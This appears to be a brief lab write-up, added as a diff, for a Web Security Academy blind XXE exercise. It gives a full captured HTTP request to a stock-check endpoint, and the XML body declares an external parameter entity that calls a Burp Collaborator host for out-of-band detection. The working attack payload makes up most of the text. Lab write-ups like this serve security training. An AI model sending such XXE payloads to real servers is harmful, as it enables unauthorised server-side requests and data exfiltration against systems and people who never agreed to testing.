@@ -1,0 +1,29 @@
+We find XML data in check stock function 
+But when we try XXE payload return error only 
+So we try a blind one 
+POST /product/stock HTTP/2
+Host: 0a7f00d2049a21d381fa52f700ef009d.web-security-academy.net
+Cookie: session=qShwUIWxxP8h8TiG287kRC7LpWzlDrjX
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://0a7f00d2049a21d381fa52f700ef009d.web-security-academy.net/product?productId=2
+Content-Type: application/xml
+Content-Length: 223
+Origin: https://0a7f00d2049a21d381fa52f700ef009d.web-security-academy.net
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Te: trailers
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE stockCheck [<!ENTITY % poc SYSTEM "http://uhfl3n02dj3dmncyn5d0qqunler4ft.burpcollaborator.net"> ]>
+<stockCheck>
+  <productId>
+    %poc;
+  </productId>
+  <storeId>
+    1
+  </storeId>
+</stockCheck>
